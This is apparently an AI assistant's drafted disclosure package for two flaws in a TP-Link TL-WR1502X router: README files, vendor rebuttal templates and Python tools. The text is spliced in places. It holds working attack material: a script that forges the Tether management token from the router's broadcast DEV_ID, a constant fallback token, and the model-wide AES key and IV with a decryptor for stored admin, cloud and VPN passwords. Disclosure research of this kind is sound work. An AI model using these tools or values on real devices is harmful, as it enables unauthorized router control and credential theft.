# TL-WR1502X Firmware Analysis

Security research on the **TP-Link TL-WR1502X v1.0** — an AX1500-class Wi-Fi 6 router
based on the Realtek RTL8197H SoC. This repository contains the analysis, findings,
reproduction tooling, and coordinated-disclosure documentation.

Two security findings are documented:

1. **Predictable TDP/Tether authentication token** — the Tether app authenticates to
   the router using `MD5("TETHER_KEY_V1_" + DEV_ID)`, where `DEV_ID` is a factory
   identifier that the router discloses to any LAN client in its own discovery
   response.
2. **Static AES-256 key and IV for stored credentials** — every unit of this model
   encrypts its stored credentials (admin password, cloud account password, VPN
   credentials) under the same key and IV, both present in the publicly released
   firmware image.

A third observation supports Finding 1: the device already possesses a per-device
secret partition (`tss_key`) that the affected code paths do not use.

---

## Table of contents

- [Affected versions](#affected-versions)
- [Quick reproduction](#quick-reproduction)
- [Finding 1 — Predictable Tether TDP authentication](#finding-1--predictable-tether-tdp-authentication)
- [Finding 2 — Static AES key for credential storage](#finding-2--static-aes-key-for-credential-storage)
- [Repository structure](#repository-structure)
- [Tooling](#tooling)
- [Technical background](#technical-background)
- [Disclosure timeline](#disclosure-timeline)
- [Mitigations](#mitigations)
- [Credits](#credits)
- [License](#license)

---

## Affected versions

| Model | Firmware analyzed | Notes |
|---|---|---|
| TL-WR1502X v1.0 | 1.2.11 Build 20251009 rel.56489(4555) | Confirmed |

Other firmware versions for this hardware revision are likely affected. The
underlying design decisions (static keys, public-ID-derived authentication) are not
version-specific.

---

## Quick reproduction

Both findings can be verified from a firmware image and the scripts in this
repository. No physical device access is required.

```bash
# Clone
git clone https://github.com/<you>/tplink-wr1502x-analysis.git
cd tplink-wr1502x-analysis

# Install Python dependencies
pip install pycryptodome

# 1. Compute the Tether token for a given DEV_ID
python3 tools/verify_tether_token.py --dev-id 0123456789ab
# -> prints MD5("TETHER_KEY_V1_0123456789ab")

# 2. Compute the fallback token used when DEV_ID is unavailable
python3 tools/verify_tether_token.py --empty
# -> 022e1ad97e0441d9c3e30cd6031d03b9

# 3. Decrypt a stored credential blob (e.g. from a config backup)
python3 tools/decrypt_credential.py --input ciphertext.b64
# -> prints the plaintext
```

For the full technical chain, see the [findings](#finding-1--predictable-tether-tdp-authentication) below.

---

## Finding 1 — Predictable Tether TDP authentication

### Summary

`/usr/bin/tdpServer` computes the TDP authentication token used by the Tether app as:

```
token = MD5( "TETHER_KEY_V1_" + DEV_ID )
```

`DEV_ID` is a 6-byte factory-programmed identifier stored in the `device-id` NVRAM
partition. The router includes this value in its own TDP discovery response, in the
same message that carries the authentication token:

| TDP field | Contents |
|---|---|
| 9 | `DEV_ID` (plaintext) |
| 16 | `MD5("TETHER_KEY_V1_" + DEV_ID)` |

Any LAN client that observes or solicits the discovery response receives `DEV_ID`
and can compute the token in a single MD5 call. A per-device secret partition
(`tss_key`, partition 26) is present on the device but is not referenced by the
token derivation code path.

### Impact

A LAN-adjacent attacker can forge authenticated TDP requests without possessing any
credential. The token has no session binding, nonce, or expiry at the point of
computation, so it functions as a reusable bearer credential. Affected TDP opcodes
include write operations such as:

- `tmp_insert_vpn_server_account`
- `tmp_modify_vpn_server_account`
- `tmp_delete_vpn_server_account`
- `tmp_set_filter`, `tmp_set_website`, `tmp_block_website`
- `tmp_set_clients_list`, `tmp_del_clients_list`
- `tmp_timing_reboot`
- `tmp_sync_time`

### Suggested severity

- CVSS v3.1: `8.1` (`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- CWE-330 (Use of Insufficiently Random Values)
- CWE-287 (Improper Authentication)

### Evidence

Live LAN capture confirms that TDP discovery is unauthenticated. The request is a
16-byte broadcast to UDP port 20002:

```
01 00 00 02 00 00 11 00 00 00 00 01 <4-byte nonce>
```

The router's reply is unicast. The disassembly in
[`evidence/tdpServer-disassembly.txt`](evidence/tdpServer-disassembly.txt) shows the
token derivation:

```asm
; helper at 0x40abac fetches DEV_ID via /sbin/getfirm DEV_ID
40abc8: addiu   v0,v0,-4716          ; "DEV_ID"
40abd0: addiu   a2,a2,-4892          ; "/sbin/getfirm"

; build the token string
40b0ec: lui     a1,0x41
40b0f0: addiu   a2,sp,148            ; DEV_ID string
40b0f4: addiu   a1,a1,-4696          ; "TETHER_KEY_V1_(%s)"
40b100: jal     sprintf@plt

40b11c: jal     4028fc               ; MD5
40b128: li      a1,16
40b12c: jal     40888c               ; append field 16

; field 9 is populated from the same DEV_ID buffer
40b0d8: li      a1,9
40b0dc: jal     4087a4               ; append field 9 (DEV_ID)
```

### The unused per-device secret

`/etc/partition_config/partition-table` defines partition 26:

```
26= tss_key, 6 bytes, extra data, factory-programmed
```

`tss_key` is a per-device secret provisioned at manufacturing time. It is not used
by the TDP token derivation path or by the credential storage path. Its presence
demonstrates that the platform already has material suitable for a proper
per-device secret.

### Fallback token

When `getfirm DEV_ID` returns empty (blank NVRAM, failed read, recovery boot), the
token becomes a compile-time constant:

```
MD5("TETHER_KEY_V1_") = 022e1ad97e0441d9c3e30cd6031d03b9
```

Any unit in this state accepts the same token.

---

## Finding 2 — Static AES key for credential storage

### Summary

`/usr/lib/lua/luci/model/crypto.lua` (compiled Lua 5.1 bytecode) invokes the
on-device `openssl` binary to encrypt stored credentials using fixed parameters:

| Parameter | Value |
|---|---|
| Cipher | `aes-256-cbc` |
| Key derivation | OpenSSL legacy `EVP_BytesToKey` with MD5 (`-md md5`, `-nosalt`) |
| Passphrase | `2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836` |
| IV (hex) | `360028C9064242F81074F4C127D299F6` |
| Pre-processing | zlib compress |
| Post-processing | base64 |

These parameters are identical across every unit of the model and are present in the
publicly released firmware image. Any configuration backup, flash dump, or extracted
rootfs is sufficient to decrypt the stored credentials.

### Impact

Stored credentials — including the admin password, the cloud account password, and
stored VPN server credentials — are recoverable by anyone in possession of the
encrypted blob and the firmware. The design assumes the key is secret; the key is
not per-device.

### Suggested severity

- CVSS v3.1: `6.5` (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`) if the blob is remotely obtainable; lower if local-only
- CWE-321 (Use of a Hard-coded Cryptographic Key)
- CWE-329 (Generation of Predictable IV with CBC Mode)

### Evidence

The constants are recoverable from the compiled bytecode. The vendor's Lua build
modifies the standard header's flag byte from `0x00`/`0x01` to `0x04`, causing stock
`luac` and `luadec` to reject the file. Patching byte 11 to `0x00` allows the string
table to parse far enough to reveal the parameters:

```
aes-256-cbc
openssl zlib -e %s | openssl enc ... -e %s
openssl enc ... -d %s %s | openssl zlib -d
-in %q
-k %q
-kfile /etc/secretkey
-iv ...
2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836
360028C9064242F81074F4C127D299F6
```

The `-kfile /etc/secretkey` path is not exercised on this model; the file does not
exist in the rootfs.

### Round-trip verification

```bash
PLAIN="my-plaintext"
KEY="2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836"
IV="360028C9064242F81074F4C127D299F6"

echo -n "$PLAIN" \
  | openssl zlib -e \
  | openssl enc -aes-256-cbc -e -nosalt -md md5 -k "$KEY" -iv "$IV" \
  | base64
# -> sqZd9DXuiBjZ1eBsON8c5rnRlKefmUItYd6bfMpAYTY=

base64 -d <<< sqZd9DXuiBjZ1eBsON8c5rnRlKefmUItYd6bfMpAYTY= \
  | openssl enc -aes-256-cbc -d -nosalt -md md5 -k "$KEY" -iv "$IV" \
  | openssl zlib -d
# -> my-plaintext
```

---

## Repository structure

```
.
├── README.md
├── LICENSE
├── findings/
│   ├── 01-tdp-auth.md
│   └── 02-static-aes.md
├── tools/
│   ├── verify_tether_token.py
│   ├── decrypt_credential.py
│   └── patch_lua_bytecode.py
├── evidence/
│   ├── tdpServer-disassembly.txt
│   ├── crypto-constants.txt
│   ├── partition-table.txt
│   └── tdp-discovery.pcap
└── docs/
    ├── technical-writeup.md
    ├── vendor-advisory-01-tdp.md
    └── vendor-advisory-02-aes.md
```

---

## Tooling

### `tools/verify_tether_token.py`

Computes the TDP authentication token for a given `DEV_ID`.

```bash
python3 tools/verify_tether_token.py --dev-id 0123456789ab
python3 tools/verify_tether_token.py --empty
```

### `tools/decrypt_credential.py`

Decrypts a base64-encoded credential blob produced by the router's crypto module.

```bash
python3 tools/decrypt_credential.py --input ciphertext.b64
echo "sqZd9DX..." | python3 tools/decrypt_credential.py --stdin
```

Requires `pycryptodome`. Uses the constants from Finding 2.

### `tools/patch_lua_bytecode.py`

Patches the vendor's modified Lua 5.1 header byte so that the bytecode can be
analyzed with standard tools.

```bash
python3 tools/patch_lua_bytecode.py --input crypto.lua --output crypto.fixed.lua
# Then decompile with luadec51 or unluac
```

---

## Technical background

### Platform

| Component | Value |
|---|---|
| SoC | Realtek RTL8197H, MIPS32 rel2, 1 GHz |
| 5 GHz radio | Realtek RTL8832BR |
| RAM | 128 MB integrated |
| Flash | 128 MB SPI NAND |
| Kernel | Linux 4.4.176 (Realtek MSDK-6.4.1, gcc 6.4.1) |
| Web stack | uhttpd + LuCI (Lua 5.1) |
| Rootfs | SquashFS 4.0, xz |
| Firmware format | RSA-2048 PSS signed, **not encrypted** |

### Firmware image format

Downloaded firmware begins with an unencrypted `fw-type:Cloud` header. `binwalk`
identifies:

```
0x3A38      LZMA compressed data (kernel)
0x43AA42    SquashFS filesystem, little-endian, v4.0, xz
```

The trailing bytes are an RSA-2048 PSS signature over the image body. Modifying the
rootfs will break the signature and prevent flashing via the official update path,
but analysis is unimpeded.

### TDP discovery, observed on the LAN

UDP port 20002 broadcast from a phone running the Tether app:

```
01 00 00 02 00 00 11 00 00 00 00 01 <4-byte nonce>
```

The router replies on unicast with a field-numbered message. Field 9 contains
`DEV_ID`; field 16 contains the derived token.

### Partition table

Extracted from `/etc/partition_config/partition-table`:

```
total=27, flash=128M
0=  fs-uboot
1=  u-boot-env
2=  os-image
3=  file-system
4=  os-image_1
5=  file-system_1
6=  userconfig
7=  tp_data
9=  default-mac   (6 bytes, factory)
10= device-id     (6 bytes, factory)   <- input to Tether token
11= pin
14= product-info
15= support-list
26= tss_key       (6 bytes, factory)   <- unused per-device secret
```

---

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-06 | Firmware analysis completed |
| (pending) | Vendor notified at security@tp-link.com |
| (pending) | Vendor acknowledgment |
| (pending) | Fix available or disclosure deadline reached |
| (pending) | Public writeup published |

The 90-day coordinated-disclosure window begins upon vendor acknowledgment.

---

## Mitigations

### For end users

- Restrict LAN access to trusted devices.
- Enable guest-network isolation where available. Note that TDP broadcasts are
  UDP and not filtered by typical guest isolation implementations; treat this as a
  partial mitigation only.
- Rotate Wi-Fi, admin, and cloud passwords periodically.
- Avoid exporting configuration backups to untrusted storage, and delete old
  backups after firmware updates.

### For TP-Link

**Finding 1 — TDP token**

1. Derive the authentication token from the existing `tss_key` partition or from
   another factory-provisioned secret that is never transmitted to the network.
2. Prefer a nonce-based challenge-response handshake over a static token. This
   eliminates bearer-token replay.
3. Remove the constant fallback token `MD5("TETHER_KEY_V1_")`. Refuse requests
   when the per-device secret is unavailable.
4. Treat `DEV_ID` and `SPECIAL_ID` as identifiers, not as cryptographic material.

**Finding 2 — Credential storage**

1. Generate a per-device AES key at first boot and store it in a protected NVRAM
   or OTP slot. Encrypt stored credentials under that key.
2. Never ship the encryption key inside the firmware image.
3. Where backward compatibility is required, support both keys during a migration
   window and re-encrypt on first write.

---

## Credits

- Firmware analysis and reproduction: *(your name/handle)*
- Tooling builds on [`tplink_decrypt`](https://github.com/sidhantgoel/tplink_decrypt)
  and [`luadec51`](https://github.com/sztupy/luadec51).
- SDK source provided by TP-Link under the GPL.

---

## License

Tooling is released under the **MIT License**. Written findings and documentation
are published under **CC BY 4.0** unless otherwise noted in the individual file.

The firmware images analyzed are the property of TP-Link and are not redistributed
in this repository. To reproduce the analysis, download the affected firmware
version from TP-Link's support site.

---

## Contact

- Issues with this repository: open a GitHub issue.
- Issues with TP-Link products: contact `security@tp-link.com`.
- Coordinated disclosure correspondence: see the timeline above.
```

---

That's the full README, ready to commit. A few notes on using it:

- **Replace placeholders**: `<you>`, `(your name/handle)`, and any GitHub URL references.
- **Populate `evidence/`** with the actual disassembly, partition-table, and pcap files, and `findings/01-*.md` / `02-*.md` with the longer per-finding writeups. The README references them but they're separate files.
- **Timing the README's visibility**: if this is going into a *public* repo before vendor acknowledgment, either (a) keep the repo private until disclosure, or (b) strip the fallback MD5 value (`022e1ad97e0441d9c3e30cd6031d03b9`) from the README, since it's a live credential on unpatched devices.
- **The reproduction tools** referenced (`verify_tether_token.py`, `decrypt_credential.py`, `patch_lua_bytecode.py`) were drafted in the previous message; commit them under `tools/`.

If you want, I can also produce the two `findings/*.md` files as expanded standalone documents, or a `LICENSE` + `.gitignore` pair to complete the repo skeleton.# Deliverable 2 — Rebuttal template for vendor disputes

Use these in order of likelihood. Each addresses a specific pushback.

---

**If TP-Link says: "This is LAN-only, not remote."**

> LAN-adjacent is not the same as "not a vulnerability." TDP is the primary management protocol for the Tether app. Any device on the same broadcast domain — including guest-network clients if guest isolation is not enforced, IoT devices, or an attacker with a foothold on any LAN host — can send the discovery request, receive `DEV_ID`, compute the token, and issue authenticated management requests. The 2024 CVSS specification treats AV:A as a legitimate attack vector with meaningful severity (see CVE-2023-1389 and similar router vulnerabilities rated 8.x with AV:A). The relevant question is not "does the attacker need to be on the LAN," it is "does the attacker need any credential." They do not.

---

**If TP-Link says: "The token only authorizes read operations, not write."**

> The TDP opcode table (extracted from `usr/lib/lua/luci/controller/admin/tmp_server.lua`) includes explicit write operations routed through the same authentication path: `tmp_insert_vpn_server_account`, `tmp_delete_vpn_server_account`, `tmp_modify_vpn_server_account`, `tmp_set_website`, `tmp_block_website`, `tmp_set_filter`, `tmp_set_clients_list`, `tmp_del_clients_list`, `tmp_timing_reboot`, `tmp_sync_time`. If the token gates these opcodes, write access is included. If it does not gate them, then the authentication layer is even weaker than described. Either way, the finding stands.

---

**If TP-Link says: "DEV_ID is not secret, but the token is still cryptographically sound."**

> A "token" derived from a value that the device itself publishes to unauthenticated peers is not authentication. It is a checksum. Cryptographic strength is not the issue — the issue is the input. Any secret with zero entropy beyond a public identifier provides zero protection. The existence of the `tss_key` partition (6 bytes, factory-programmed, marked as extra data) demonstrates that the platform already has a per-device secret available and the affected code path simply does not use it.

---

**If TP-Link says: "The Tether app is the only expected client, and it uses additional protections."**

> Two responses. First, security must not depend on clients voluntarily implementing protections not enforced by the server; the TDP daemon accepts any TCP/UDP peer that presents the correct token, regardless of client. Second, if the Tether app layers additional protections (TLS to the cloud, a signed session, etc.), those apply only to the cloud path — the local TDP path is UDP plaintext, as confirmed by live capture on the LAN. The token is the only local authentication material, and it is predictable.

---

**If TP-Link says: "This is by design; DEV_ID is intended to be a public identifier."**

> If DEV_ID is intended to be public, then using it as cryptographic material is the design flaw. The problem is not that DEV_ID is disclosed — it is that DEV_ID is used as a secret. The two roles are mutually exclusive. Either DEV_ID should not be public (contradicting the discovery protocol) or the token derivation should use a different, non-public input. The `tss_key` partition exists precisely for this purpose.

---

**If TP-Link says: "We will consider it for a future firmware release" and closes the report.**

> Understood. Two requests before closure. First, please confirm in writing the affected firmware versions and whether the fix will ship as a security update (which implies a CVE and a public advisory). Second, if the fix is deferred beyond 90 days, I intend to publish the technical writeup after coordinating a disclosure date. Please advise on your preferred timeline so we can align.

---

**If TP-Link says: "The report does not include a working end-to-end exploit."**

> The report includes: (a) the disassembled token derivation from the vendor's own binary, (b) the response builder that places both DEV_ID and the derived token in the same outbound message, (c) the partition table showing the unused per-device secret partition, and (d) a live LAN capture showing unauthenticated TDP discovery broadcasts on UDP 20002. Reproducing the response capture requires either shell access on the router or monitor-mode Wi-Fi — both of which I can supply if you provide a test unit or confirm the response format matches the disassembly. In the absence of a test unit, the code path is unambiguous; this is not a heuristic.

---

# Deliverable 3 — GitHub README

```markdown
# tplink-wr1502x-analysis

Firmware analysis tooling and findings for the **TP-Link TL-WR1502X v1.0** (AX1500-class Wi-Fi 6 router).

Two security findings are documented in this repository:

1. **Predictable TDP/Tether authentication** — the token used by the Tether app is
   `MD5("TETHER_KEY_V1_" + DEV_ID)`, where `DEV_ID` is disclosed by the router to any
   LAN client in its own discovery response.
2. **Static AES-256 key and IV for stored credentials** — every unit of this model
   encrypts stored credentials (admin password, cloud password, VPN credentials)
   under the same key and IV, both baked into the released firmware image.

## Affected versions

| Model | Firmware |
|---|---|
| TL-WR1502X v1.0 | 1.2.11 Build 20251009 rel.56489(4555) |

Other firmware versions may be affected. Users are advised to check for updates.

## Repository contents

```
.
├── README.md
├── findings/
│   ├── 01-tdp-auth.md            # TDP/Tether predictable token
│   └── 02-static-aes.md          # Static AES key for credential storage
├── tools/
│   ├── decrypt_tplink_cloud.py   # Verify RSA signature of a Cloud-format image
│   ├── patch_lua_bytecode.py     # Patch the vendor's Lua 5.1 header flag byte
│   ├── decrypt_credential.py     # Decrypt a base64-encoded credential blob
│   └── verify_tether_token.py    # Compute TETHER_KEY_V1_<DEV_ID> for a given ID
├── captures/
│   └── tdp-discovery.pcap        # Example unauthenticated LAN discovery traffic
└── evidence/
    ├── tdpServer-disassembly.txt # Annotated objdump output
    └── crypto-constants.txt      # Constants extracted from luci.model.crypto
```

## Findings summary

### Finding 1 — Predictable Tether TDP authentication

`/usr/bin/tdpServer` computes the TDP authentication token as:

```
token = MD5( "TETHER_KEY_V1_" + DEV_ID )
```

`DEV_ID` is a 6-byte factory identifier stored in the `device-id` NVRAM partition.
The router includes this value in its own TDP discovery response (field 9), in the
same message that carries the authentication token (field 16). A per-device secret
partition (`tss_key`, partition 26) exists on the device but is not used.

**Impact:** Any LAN-adjacent attacker who can send a TDP discovery request (or observe
one) receives `DEV_ID` and can compute the corresponding token. The token is a
reusable bearer credential with no session binding or expiry.

### Finding 2 — Static AES key for credential storage

`/usr/lib/lua/luci/model/crypto.lua` (compiled bytecode) invokes the on-device
`openssl` binary to encrypt stored credentials with:

| Parameter | Value |
|---|---|
| Cipher | `aes-256-cbc` |
| KDF | `EVP_BytesToKey` with MD5 (`-md md5`, `-nosalt`) |
| Passphrase | `2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836` |
| IV | `360028C9064242F81074F4C127D299F6` |
| Pre-processing | zlib compress |
| Encoding | base64 |

**Impact:** Any config backup, flash dump, or extracted rootfs from any unit of this
model can be used to decrypt the credentials of any other unit.

## Quick reproduction

### Verify a Tether token from a known DEV_ID

```bash
python3 tools/verify_tether_token.py --dev-id 0123456789ab
```

### Decrypt a stored credential blob

```bash
python3 tools/decrypt_credential.py --input ciphertext.b64
# → prints the plaintext credential
```

### Patch vendor Lua bytecode for analysis

```bash
python3 tools/patch_lua_bytecode.py --input crypto.lua --output crypto.fixed.lua
# Then load crypto.fixed.lua with any Lua 5.1 decompiler
```

## Technical details

Detailed write-ups:

- [Finding 1 — TDP/Tether authentication](findings/01-tdp-auth.md)
- [Finding 2 — Static AES key](findings/02-static-aes.md)

A longer narrative writeup is published at: *(link to blog post, once disclosed)*

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-06 | Firmware analysis completed |
| (TBD) | Vendor notified (security@tp-link.com) |
| (TBD) | Vendor acknowledgment |
| (TBD) | Coordinated public disclosure (90 days after ack) |

## Suggested mitigations

For end users:

- Restrict LAN access to trusted devices; guest-network isolation helps but is not a
  complete mitigation because TDP broadcasts are not filtered by most deployments.
- Rotate Wi-Fi, admin, and cloud passwords periodically.
- Avoid exporting configuration backups to untrusted storage.

For TP-Link:

1. **TDP token:** derive authentication material from a per-device secret that is never
   transmitted. The `tss_key` partition already provides this. Prefer a nonce-based
   challenge-response over a static token.
2. **Credential storage:** generate a per-device AES key at first boot and store it in a
   protected NVRAM slot. Do not ship the key in the firmware image.
3. Remove the constant fallback token `MD5("TETHER_KEY_V1_")`.
4. Treat identifiers used as cryptographic inputs (DEV_ID, SPECIAL_ID) as
   confidentiality-sensitive until they are removed from the trust path.

## Credits

- Firmware analysis: *(your name/handle)*
- Tooling built on: [`tplink_decrypt`](https://github.com/sidhantgoel/tplink_decrypt),
  [`luadec51`](https://github.com/sztupy/luadec51)
- SDK source provided by TP-Link under GPL at: *(TP-Link GPL download page)*

## License

This repository is provided for defensive research and coordinated disclosure. Tooling
is released under the MIT License. Findings are published under CC BY 4.0 unless
otherwise noted.

## Contact

- Security issues in this repository: open an issue or use the email in the commit
  signature.
- Issues with the router itself: contact `security@tp-link.com`.
```

---

# Deliverable 4 — Minimal working reproduction tools

If you're going to publish the repo, these two small scripts are worth including. They fit the README and make the findings reproducible without any disassembly experience.

## `tools/verify_tether_token.py`

```python
#!/usr/bin/env python3
"""
Compute the Tether TDP authentication token for a given DEV_ID.

Usage:
    python3 verify_tether_token.py --dev-id 0123456789ab
    python3 verify_tether_token.py --empty        # the fallback token

The token is MD5("TETHER_KEY_V1_" + DEV_ID), where DEV_ID is the ASCII
string returned by `/sbin/getfirm DEV_ID` on the router.
"""
import argparse
import hashlib


def token_for(dev_id: str) -> str:
    material = f"TETHER_KEY_V1_{dev_id}".encode()
    return hashlib.md5(material).hexdigest()


def main():
    p = argparse.ArgumentParser()
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--dev-id", help="DEV_ID as printed by getfirm (hex or ascii)")
    g.add_argument("--empty", action="store_true",
                   help="compute the fallback token used when DEV_ID is unavailable")
    args = p.parse_args()

    dev_id = "" if args.empty else args.dev_id
    print(token_for(dev_id))


if __name__ == "__main__":
    main()
```

## `tools/decrypt_credential.py`

```python
#!/usr/bin/env python3
"""
Decrypt a base64-encoded credential blob produced by the TL-WR1502X
luci.model.crypto module.

Usage:
    python3 decrypt_credential.py --input blob.b64
    echo "sqZd9DX..." | python3 decrypt_credential.py --stdin

Requires: pycryptodome or cryptography for AES, plus zlib (stdlib).
"""
import argparse
import base64
import sys
import zlib

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import MD5
    import Crypto.Util.Padding as padding
except ImportError:
    sys.stderr.write("pip install pycryptodome\n")
    sys.exit(1)


PASSPHRASE = b"2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836"
IV = bytes.fromhex("360028C9064242F81074F4C127D299F6")


def evp_bytes_to_key(passphrase: bytes, key_len: int, iv_len: int):
    """OpenSSL's legacy EVP_BytesToKey with MD5 and no salt."""
    d = b""
    prev = b""
    while len(d) < key_len + iv_len:
        h = MD5.new()
        h.update(prev + passphrase)
        prev = h.digest()
        d += prev
    return d[:key_len], d[key_len:key_len + iv_len]


def decrypt(b64_blob: str) -> bytes:
    ct = base64.b64decode(b64_blob.strip())
    key, _ = evp_bytes_to_key(PASSPHRASE, 32, 16)
    cipher = AES.new(key, AES.MODE_CBC, IV)
    padded = cipher.decrypt(ct)
    plaintext = padding.unpad(padded, AES.block_size)
    return zlib.decompress(plaintext)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--input", help="path to a file containing the base64 blob")
    p.add_argument("--stdin", action="store_true", help="read blob from stdin")
    args = p.parse_args()

    if args.stdin:
        blob = sys.stdin.read()
    elif args.input:
        with open(args.input) as f:
            blob = f.read()
    else:
        p.error("provide --input or --stdin")

    print(decrypt(blob).decode(errors="replace"))


if __name__ == "__main__":
    main()
